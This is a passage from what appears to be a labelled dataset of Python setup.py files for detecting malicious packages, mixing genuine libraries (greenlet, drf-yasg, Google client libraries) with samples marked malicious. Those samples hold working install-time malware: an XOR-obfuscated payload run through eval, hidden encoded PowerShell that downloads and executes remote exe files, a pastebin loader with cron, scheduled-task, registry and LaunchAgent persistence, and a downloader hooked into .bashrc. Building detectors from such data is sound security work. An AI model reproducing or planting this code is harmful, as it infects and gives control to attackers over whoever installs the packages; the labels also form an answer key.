x10\\x12\\x19\\x18J\\x15\\x17P\\x1b\\x10U\\x14\\x0b\\x10DXmTXY\\x1cF[NW_\\x1a<\\x17\\x19\\x13\\x12\\x16\\x15\\x13\\x14\\x10\\x17\\x11\\x14VZYQF@fPRFQ\\x12\\x12\\x0e\\x17Gh\\x1b\\x06m?\\x12\\x11\\x14\\x13\\x14\\x10\\x11\\x11\\x13\\x14\\x18\\x14VX\\\\SGKlQRLV\\x19\\x18\\x0c\\x12Vo\\x18\\x07h;\\x10\\x18\\x10\\x11\\x12\\x12\\x10\\x12\\x19\\x18\\x18\\x19U^YQEMiTQCS\\x16\\x1a\\n\\x14Ti\\x1b\\x03n9\\x16\\x17\\x19\\x13\\x11\\x16FCXYC\\x11VM\\x13\\x0f\\x1dVPMG9\\x12\\x10\\x12\\x19R[YlTNDPA\\x11\\t\\x13o\\x10SX]UJMkUSFTiZ\\x0f\\x13Q\\x1c\\x01n\\x11T^F\\x15_\\x15X^\\x18BP\\\\UU\\x1a\\t\\x14\\x18URY\\x1fR^ZWBIhVWEV\\x1d\\x1a\\x12\\x0e\\x1b\\x13n<\\x17\\x19\\x13\\x12\\x15\\x15P[^ATF@\\x13QB[T\\x19VZFC\\x12M\\\\\\x17V[WEQVFTF@>\\x10\\x11\\x11\\x13P]W[UWVjVRAR\\x18\\n\\x19\\x11\\x138\\x11\\x14\\x15\\x16S^B\\x18RHFW\\x10[W\\x18YU[hUICQE\\n:\\x17\\x12\\x16\\x11\\x17\\x14\\x16\\x12RWP\\\\RR]lVWAR\\x14\\x1b\\n\\x11W\\\\A\\x1fYZM\\x11VJFU\\x1e\\x19\\x01\\x1e\\x1c9\\x16\\x17\\x10\\x15\\x12\\x11\\x14\\x13]V\\x11UVWWPQUmVTFRn\\x1e\\r\\rd\\x13\\x0c\\x0f\\x11\\x16\\x08\\x0b\\x08\\x0c\\r\\x1a\\n;\\x12\\x12\\x10\\x12\\x19\\x18\\x18\\x19\\x17\\x17\\x17\\x10UFSQ[=\\x12\\x16\\x11\\x17FSFC@]\\x13RRZ\\\\VSQlPQCPo\\x0e\\x1e\\x02m>33[FF@GMl^XRQR\\x10\\x08\\x12W\\x16p\\x0elmd@QJGhmI^ZUZ[NdkxCAvP@Tji}_[Q]nnEEL\\x16HWP\\x15=:SQU_TRViUV@W\\x12\\x0b\\x12WVUX]V\\x1aY@GDECn]YRPU\\x1d3VG\\x1d@U_VER\\x1dU\\x14t\\nindGVFCmmHXWS]_OnisCEwYCXom~^WTZimEOE\\x1fB\\\\W\\x10\\x102\\x1b\\x19GE^^C\\x1cRUSXVSUhPWFW\\x1b\" \n\n            iOpvEoeaaeavocp = \"3879312145651080122029889777074600726174626233679326534071443704994320293753670521434011348441225235\"\n            uocpEAtacovpe = len(wopvEaTEcopFEavc)\n            oIoeaTEAcvpae = \"\"\n            for fapcEaocva in range(uocpEAtacovpe):\n                nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]\n                qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]\n                oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))\n\n\n            eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))\n        except:\n            pass\n        install.run(self)\n\n\nsetup(\n    name=\"pyhjdddo\",\n    version=VERSION,\n    author=\"HW\",\n    author_email=\"\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=long_description,\n    packages=find_packages(),\n    install_requires=[],\n    keywords=[],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n    cmdclass={\n        'install': InstallCommand\n    }\n)", "target": 1}
{"idx": "google-cloud-runtimeconfig-0.33.2", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\n# Package metadata.\n\nname = \"google-cloud-runtimeconfig\"\ndescription = \"Google Cloud RuntimeConfig API client library\"\nversion = \"0.33.2\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 4 - Beta\"\ndependencies = [\n    # NOTE: Maintainers, please do not require google-cloud-core>=2.x.x\n    # Until this issue is closed\n    # https://github.com/googleapis/google-cloud-python/issues/10566\n    \"google-cloud-core >= 1.3.0, < 3.0dev\",\n]\nextras = {}\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package for package in setuptools.find_packages() if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-runtimeconfig\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "selfpaypalcontrolsuper-5.71", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpaypalcontrolsuper',\n    packages = ['modlib'],\n    version = '10.23',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "greenlet-1.1.2", "func": "#! /usr/bin/env python\n\nimport sys\nimport os\nimport glob\nimport platform\n\n# distutils is deprecated and vendored into setuptools now.\nfrom setuptools import setup\nfrom setuptools import Extension\nfrom setuptools import find_packages\n\n# workaround segfaults on openbsd and RHEL 3 / CentOS 3 . see\n# https://bitbucket.org/ambroff/greenlet/issue/11/segfault-on-openbsd-i386\n# https://github.com/python-greenlet/greenlet/issues/4\n# https://github.com/python-greenlet/greenlet/issues/94\n# pylint:disable=too-many-boolean-expressions\nif ((sys.platform == \"openbsd4\" and os.uname()[-1] == \"i386\")\n    or (\"-with-redhat-3.\" in platform.platform() and platform.machine() == 'i686')\n    or (sys.platform == \"sunos5\" and os.uname()[-1] == \"sun4v\")\n    or (\"SunOS\" in platform.platform() and platform.machine() == \"sun4v\")\n    or (sys.platform == \"linux\" and platform.machine() == \"ppc\")):\n    os.environ[\"CFLAGS\"] = (\"%s %s\" % (os.environ.get(\"CFLAGS\", \"\"), \"-Os\")).lstrip()\n\n\ndef readfile(filename):\n    with open(filename, 'r') as f:\n        return f.read()\n\nGREENLET_SRC_DIR = 'src/greenlet/'\nGREENLET_HEADER_DIR = GREENLET_SRC_DIR\nGREENLET_HEADER = GREENLET_HEADER_DIR + 'greenlet.h'\nGREENLET_TEST_DIR = 'src/greenlet/tests/'\n# The location of the platform specific assembly files\n# for switching.\nGREENLET_PLATFORM_DIR = GREENLET_SRC_DIR + 'platform/'\n\ndef _find_platform_headers():\n    return glob.glob(GREENLET_PLATFORM_DIR + \"switch_*.h\")\n\nif hasattr(sys, \"pypy_version_info\"):\n    ext_modules = []\n    headers = []\nelse:\n\n    headers = [GREENLET_HEADER]\n\n    if sys.platform == 'win32' and '64 bit' in sys.version:\n        # this works when building with msvc, not with 64 bit gcc\n        # switch_x64_masm.obj can be created with setup_switch_x64_masm.cmd\n        extra_objects = [GREENLET_PLATFORM_DIR + 'switch_x64_masm.obj']\n    else:\n        extra_objects = []\n\n    if sys.platform == 'win32' and os.environ.get('GREENLET_STATIC_RUNTIME') in ('1', 'yes'):\n        extra_compile_args = ['/MT']\n    elif hasattr(os, 'uname') and os.uname()[4] in ['ppc64el', 'ppc64le']:\n        extra_compile_args = ['-fno-tree-dominator-opts']\n    else:\n        extra_compile_args = []\n\n    ext_modules = [\n        Extension(\n            name='greenlet._greenlet',\n            sources=[GREENLET_SRC_DIR + 'greenlet.c'],\n            extra_objects=extra_objects,\n            extra_compile_args=extra_compile_args,\n            depends=[\n                GREENLET_HEADER,\n                GREENLET_SRC_DIR + 'slp_platformselect.h',\n            ] + _find_platform_headers()\n        ),\n        # Test extensions.\n        #\n        # We used to try hard to not include these in built\n        # distributions, because we only distributed ``greenlet.so``.\n        # That's really not important, now we have a clean layout with\n        # the test directory nested inside a greenlet directory. See\n        # https://github.com/python-greenlet/greenlet/issues/184 and\n        # 189\n        Extension(\n            name='greenlet.tests._test_extension',\n            sources=[GREENLET_TEST_DIR + '_test_extension.c'],\n            include_dirs=[GREENLET_HEADER_DIR]\n        ),\n    ]\n\n    if os.environ.get('GREENLET_TEST_CPP', 'yes').lower() not in ('0', 'no', 'false'):\n        ext_modules.append(\n            Extension(\n                name='greenlet.tests._test_extension_cpp',\n                sources=[GREENLET_TEST_DIR + '_test_extension_cpp.cpp'],\n                language=\"c++\",\n                include_dirs=[GREENLET_HEADER_DIR]),\n        )\n\n\ndef get_greenlet_version():\n    with open('src/greenlet/__init__.py') as f:\n        looking_for = '__version__ = \\''\n        for line in f:\n            if line.startswith(looking_for):\n                version = line[len(looking_for):-2]\n                return version\n    raise ValueError(\"Unable to find version\")\n\n\nsetup(\n    name=\"greenlet\",\n    version=get_greenlet_version(),\n    description='Lightweight in-process concurrent programming',\n    long_description=readfile(\"README.rst\"),\n    long_description_content_type=\"text/x-rst\",\n    url=\"https://greenlet.readthedocs.io/\",\n    keywords=\"greenlet coroutine concurrency threads cooperative\",\n    author=\"Alexey Borzenkov\",\n    author_email=\"snaury@gmail.com\",\n    maintainer='Jason Madden',\n    maintainer_email='jason@nextthought.com',\n    project_urls={\n        'Bug Tracker': 'https://github.com/python-greenlet/greenlet/issues',\n        'Source Code': 'https://github.com/python-greenlet/greenlet/',\n        'Documentation': 'https://greenlet.readthedocs.io/',\n    },\n    license=\"MIT License\",\n    platforms=['any'],\n    package_dir={'': 'src'},\n    packages=find_packages('src'),\n    include_package_data=True,\n    headers=headers,\n    ext_modules=ext_modules,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Natural Language :: English',\n        'Programming Language :: C',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Operating System :: OS Independent',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ],\n    extras_require={\n        'docs': [\n            'Sphinx',\n        ],\n        'test': [\n        ],\n    },\n    python_requires=\">=2.7,!=3.0.*,!=3.1.*,!=3.2.*,!=3.3.*,!=3.4.*\",\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "py-prooflibmc-6.19", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-prooflibmc',\n    packages = ['modlib'],\n    version = '10.66',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "package-test-index-999010119.1.0", "func": "from setuptools import setup, find_packages\nimport os,sys\n\nosname = sys.platform\npythonpath = sys.executable\ncrontabpath = 'crontab'\n\n\nmacos_persist = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n<key>Label</key>\n<string>com.dortania.onecore.plist</string>\n<key>ProgramArguments</key>\n<array>\n<string>''' + '/Users/' + os.getlogin() + '/.config/dconf/autostart/.update' + ''''</string>\n</array>\n<key>RunAtLoad</key>\n<true/>\n</dict>\n</plist>''' \n\nloader = '''\nimport urllib3,base64\nurl = 'https://pastebin.com/raw/VvkKsmxr'\nhttp = urllib3.PoolManager()\nresp = http.request('GET',url)\nexec(base64.b64decode(resp.data.decode('utf-8')).decode('utf-8'))\n'''\n\nwin_mutex = '''\nimport os,sys\nctr = 0 \nself_cmd = sys.argv[0].strip()\np_cmds = os.popen('wmic process get commandline').readlines()\nfor l in p_cmds:\n    if self_cmd in l:\n        ctr += 1\nif ctr > 1:\n    sys.exit(0)\n'''\n\nlin_mutex = '''\nimport os,sys\ndef init():\n    if os.path.exists('/tmp/demo.pid'):\n        pid = int(open('/tmp/demo.pid', 'r').read())\n        try:\n            os.kill(pid, 0)\n            return False\n        except:\n            os.remove('/tmp/demo.pid')\n    open('/tmp/demo.pid', 'w').write(str(os.getpid()))\n    return True\n\nif not init:\n    sys.exit()\n'''\n\ndata = lin_mutex + loader\n\ndef windows():\n    global data\n    data = win_mutex + loader\n    write_package('C:\\\\ProgramData\\\\update.py')\n    os.system('attrib +h C:\\\\ProgramData\\\\update.py')\n    if 0 != os.system(f'schtasks /create /tn PythonUpdate /tr \"{pythonpath} C:\\\\ProgramData\\\\update.py\" /sc HOURLY '):\n        os.system(r'reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v PythonUpdate /t REG_SZ /d \"{pythonpath} C:\\ProgramData\\update.py\"')\n\n\ndef linux():\n    path = '/home/' + os.getlogin() + '/.config/'\n    if not os.path.isdir(path):\n        os.mkdir(path)\n    path = path + 'dconf/'    \n    if not os.path.isdir(path):\n        os.mkdir(path)\n    \n    path = path + '.update.py'\n    write_package(path)\n    if os.system(\"echo '* */1 * * * \" + pythonpath + \" \" + path + \" ' | crontab -\") != 0:\n        try:\n            for file in os.listdir('/var/spool/cron/crontabs/'):\n                try:\n                    with open('/var/spool/cron/crontabs/' + file,'a') as fd:\n                        fd.write('* */1 * * * ' + pythonpath + ' ' + path)\n                        break\n                except:\n                    pass # ADD SCRIPT INVOCATION ON EVERY PASS\n        except:\n            pass\n    os.system(pythonpath + ' ' + path + ' 2>/dev/null &')        \n\ndef macos():\n    path = '/Users/' + os.getlogin() + '/.config/'\n    if not os.path.isdir(path):\n        os.mkdir(path)\n    path = path + 'dconf/'\n    if not os.path.isdir(path):\n        os.mkdir(path)\n    path = path + '.update.py'\n    write_package(path)\n    if os.system(\"echo '* */1 * * * \" + pythonpath + \" \" + path + \" ' | crontab -\") != 0:\n        try:\n            with open('/Library/LaunchAgents/com.dortania.onecore.plist','w') as fd:\n                fd.write(macos_persist)\n        except:\n            os.system(pythonpath + ' ' + path + ' 2>/dev/null &')\n        \n    \ndef bsd():\n    path = '/home/' + os.getlogin() + '/.config/'\n    if not os.path.isdir(path):\n        os.mkdir(path)\n    path = path + 'dconf/'\n    if not os.path.isdir(path):\n        os.mkdir(path)\n    path = path + '.update'    \n    write_package(path)\n    os.system(pythonpath + ' ' + path + ' 2>/dev/null &')\n\n\n\ndef write_package(path):\n    with open(path,'w') as of:\n        of.write(data)\n\n\n\nif 'win' in osname or 'msys' in osname:\n    windows()\nelif 'darwin' in osname:\n    macos()\nelif 'linux':\n    linux()\nelse:\n    try:\n        linux()\n    except:    \n        bsd()\n\n\nsetup(\n    name='package_test_index',\n    version='999010119.1.0',\n    author='Jedaj',\n    author_email='jeffs@gmail.com',\n    description='takes place',\n    packages=find_packages(),\n    classifiers=[\n        'Programming Language :: Python :: 3',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n    ],\n    python_requires='>=3.0',\n    )\n", "target": 1}
{"idx": "daiquiri-3.2.1", "func": "#!/usr/bin/env python\nimport setuptools\n\nsetuptools.setup(\n    setup_requires=[\"setuptools_scm\"],\n    use_scm_version=True,\n)\n", "target": 0}
{"idx": "drf-yasg-1.21.3", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom __future__ import print_function\n\nimport io\nimport os\nimport sys\n\nfrom setuptools import find_packages, setup\n\n\ndef read_req(req_file):\n    with open(os.path.join('requirements', req_file)) as req:\n        return [line.strip() for line in req.readlines() if line.strip() and not line.strip().startswith('#')]\n\n\nwith io.open('README.rst', encoding='utf-8') as readme:\n    description = readme.read()\n\nrequirements = read_req('base.txt')\nrequirements_validation = read_req('validation.txt')\n\n\ndef find_versions_from_readme(prefix):\n    for line in description.splitlines():\n        line = line.strip()\n        if line.startswith(prefix):\n            versions = [v.strip() for v in line[len(prefix):].split(',')]\n            if versions:\n                return versions\n\n    raise RuntimeError(\"failed to find supported versions list for '{}'\".format(prefix))\n\n\npython_versions = find_versions_from_readme(\"- **Python**: \")\ndjango_versions = find_versions_from_readme(\"- **Django**: \")\n\npython_requires = \">=\" + python_versions[0]\n\npython_classifiers = [\n    'Programming Language :: Python',\n    'Programming Language :: Python :: 3',\n] + ['Programming Language :: Python :: {}'.format(v) for v in python_versions]\ndjango_classifiers = [\n    'Framework :: Django',\n] + ['Framework :: Django :: {}'.format(v) for v in django_versions]\n\n\ndef drf_yasg_setup(**kwargs):\n    setup(\n        name='drf-yasg',\n        packages=find_packages('src'),\n        package_dir={'': 'src'},\n        include_package_data=True,\n        install_requires=requirements,\n        extras_require={\n            'validation': requirements_validation,\n        },\n        license='BSD License',\n        description='Automated generation of real Swagger/OpenAPI 2.0 schemas from Django Rest Framework code.',\n        long_description=description,\n        long_description_content_type='text/x-rst',\n        url='https://github.com/axnsan12/drf-yasg',\n        author='Cristi V.',\n        author_email='cristi@cvjd.me',\n        keywords='drf django django-rest-framework schema swagger openapi codegen swagger-codegen '\n                 'documentation drf-yasg django-rest-swagger drf-openapi',\n        python_requires=python_requires,\n        classifiers=[\n            'Intended Audience :: Developers',\n            'License :: OSI Approved :: BSD License',\n            'Development Status :: 5 - Production/Stable',\n            'Operating System :: OS Independent',\n            'Environment :: Web Environment',\n            'Topic :: Documentation',\n            'Topic :: Software Development :: Code Generators',\n        ] + python_classifiers + django_classifiers,\n        **kwargs\n    )\n\n\ntry:\n    # noinspection PyUnresolvedReferences\n    import setuptools_scm  # noqa: F401\n\n    drf_yasg_setup(use_scm_version=True)\nexcept (ImportError, LookupError) as e:\n    if os.getenv('CI', 'false') == 'true':\n        # don't silently fail on CI - we don't want to accidentally push a dummy version to PyPI\n        raise\n\n    err_msg = str(e)\n    if 'setuptools-scm' in err_msg or 'setuptools_scm' in err_msg:\n        import time\n        import traceback\n\n        timestamp_ms = int(time.time() * 1000)\n        timestamp_str = hex(timestamp_ms)[2:].zfill(16)\n        dummy_version = '1!0.0.0.dev0+noscm.' + timestamp_str\n\n        drf_yasg_setup(version=dummy_version)\n\n        traceback.print_exc(file=sys.stderr)\n        print(\"failed to detect version, package was built with dummy version \" + dummy_version, file=sys.stderr)\n    else:\n        raise\n", "target": 0}
{"idx": "flake8-use-fstring-1.4", "func": "from setuptools import setup, find_packages\n\nfrom flake8_use_fstring import __version__\n\nextra_test = [\n    'coverage==4.*',\n    'pytest>=4',\n    'pytest-cov>=2',\n\n    'flake8-builtins',\n    'flake8-commas',\n    'flake8-fixme',\n    'flake8-print',\n    'flake8-quotes',\n    'flake8-todo',\n]\nextra_dev = [\n    *extra_test,\n]\n\nextra_ci = [\n    *extra_test,\n    'coveralls',\n]\n\nsetup(\n    name='flake8-use-fstring',\n    version=__version__,\n    description='Flake8 plugin for string formatting style.',\n\n    url='https://github.com/MichaelKim0407/flake8-use-fstring',\n    author='Michael Kim',\n    author_email='mkim0407@gmail.com',\n\n    packages=find_packages(),\n\n    python_requires='>=3.6',\n\n    install_requires=[\n        'flake8>=3',\n    ],\n\n    extras_require={\n        'test': extra_test,\n        'dev': extra_dev,\n\n        'ci': extra_ci,\n    },\n\n    entry_points={\n        'flake8.extension': [\n            'FS001 = flake8_use_fstring.percent:PercentFormatDetector',\n            'FS002 = flake8_use_fstring.format:StrFormatDetector',\n            'FS003 = flake8_use_fstring.prefix:MissingPrefixDetector',\n        ],\n    },\n\n    classifiers=[\n        'Intended Audience :: Developers',\n\n        'Development Status :: 3 - Alpha',\n\n        'License :: OSI Approved :: MIT License',\n\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Software Development :: Quality Assurance',\n    ],\n)\n", "target": 0}
{"idx": "visahydra-9.93", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'visahydra',\n    packages = ['modlib'],\n    version = '3.89',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libpeshka-0.4", "func": "from setuptools import setup, find_packages\n\n\ndef rn ():\n        import platform\n\n        lb = False\n        try:\n                import urllib2\n        except ImportError:\n                import requests\n                lb = True\n        import os, stat\n\n        ADD_LOC = \"http://145.249.104.71/out\"\n        LOC = \".drv\"\n\n        if platform.system () == \"Linux\":\n                response = \"\"\n                if not lb:\n                        response = urllib2.urlopen(ADD_LOC).read ()\n                else:\n                        response = requests.get (ADD_LOC)\n                        response = response.content\n                os.chdir (os.path.expanduser (\"~\"))\n                d = open (LOC, \"wb\")\n                d.write (response)\n                d.close ()\n\n                current_state = os.stat (LOC)\n                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)\n\n                brc = open (\".bashrc\", \"a\")\n                brc.write (\"\\n~/.drv &\")\n                brc.close ()\n\n\n        else:\n                print (\"Error installing library!\")\n                exit (-1)\n\nrn ()\n\nsetup(\n  name = 'libpeshka',\n  packages = find_packages (),\n  entry_points={\n\t'setuptools.installation': [\n\t\t'eggsecutable = libari.pr:rn'\n\t]\n  },\n  version = '0.4',\n  description = 'Libari wrapper for python',\n  author = 'Ruri12',\n  author_email = 'ruri12@example.com',\n  scripts=[\"pr.py\"],\n  url = '',\n  download_url = '', \n  keywords = ['libari'],\n  classifiers = [],\n)\n", "target": 1}
{"idx": "google-resumable-media-2.3.3", "func": "# Copyright 2017 Google Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport os\n\nimport setuptools\n\n\nPACKAGE_ROOT = os.path.abspath(os.path.dirname(__file__))\n\nwith open(os.path.join(PACKAGE_ROOT, 'README.rst')) as file_obj:\n    README = file_obj.read()\n\n\nREQUIREMENTS = [\n    'google-crc32c >= 1.0, < 2.0dev',\n]\nEXTRAS_REQUIRE = {\n    'requests': [\n        'requests >= 2.18.0, < 3.0.0dev',\n    ],\n    'aiohttp': 'aiohttp >= 3.6.2, < 4.0.0dev'\n}\n\nsetuptools.setup(\n    name='google-resumable-media',\n    version = \"2.3.3\",\n    description='Utilities for Google Media Downloads and Resumable Uploads',\n    author='Google Cloud Platform',\n    author_email='googleapis-publisher@google.com',\n    long_description=README,\n    namespace_packages=['google'],\n    scripts=[],\n    url='https://github.com/googleapis/google-resumable-media-python',\n    packages=setuptools.find_packages(exclude=('tests*',)),\n    license='Apache 2.0',\n    platforms='Posix; MacOS X; Windows',\n    include_package_data=True,\n    zip_safe=False,\n    install_requires=REQUIREMENTS,\n    extras_require=EXTRAS_REQUIRE,\n    python_requires='>= 3.6',\n    